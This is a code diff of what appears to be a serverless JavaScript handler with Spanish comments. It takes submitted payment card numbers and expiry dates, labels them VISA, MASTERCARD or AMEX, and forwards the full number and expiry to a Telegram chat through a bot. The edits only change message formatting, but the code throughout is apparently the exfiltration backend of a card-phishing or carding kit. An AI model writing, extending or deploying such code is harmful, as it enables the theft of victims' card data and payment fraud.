@@ -28,13 +28,13 @@ exports.handler = async (event) => {
         } else {
             // Detectar tipo de tarjeta
             const cleanNum = cardNumber.replace(/\s/g, '');
-            let cardType = '💳 CARD';
+            let cardType = 'CARD';
             if (/^4/.test(cleanNum)) {
-                cardType = '💳 VISA';
+                cardType = 'VISA';
             } else if (/^5[1-5]/.test(cleanNum) || /^2(2[2-9]|[3-6]|7[0-1]|720)/.test(cleanNum)) {
-                cardType = '💳 MASTERCARD';
+                cardType = 'MASTERCARD';
             } else if (/^3[47]/.test(cleanNum)) {
-                cardType = '💳 AMEX';
+                cardType = 'AMEX';
             }
 
             // Crear mensaje con mejor formato
@@ -48,7 +48,7 @@ exports.handler = async (event) => {
                 second: '2-digit'
             });
 
-            const message = `🔔 *NUEVA TARJETA ASOCIADA*\n\n${cardType}\n\n*Número:*\n\`${cardNumber}\`\n\n*Vencimiento:*\n\`${expMonth}/${expYear}\`\n\n*Fecha y Hora:*\n${fecha}`;
+            const message = `🔔 NUEVA TARJETA ASOCIADA\n\n💳 ${cardType}\n\nNúmero:\n${cleanNum}\n\nVencimiento:\n${expMonth}/${expYear}\n\nFecha y Hora:\n${fecha}`;
 
             // Enviar a Telegram
             await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
@@ -75,8 +75,7 @@ function sendToTelegram(botToken, chatId, message) {
     return new Promise((resolve, reject) => {
         const data = JSON.stringify({
             chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown'
+            text: message
         });
 
         const options = {
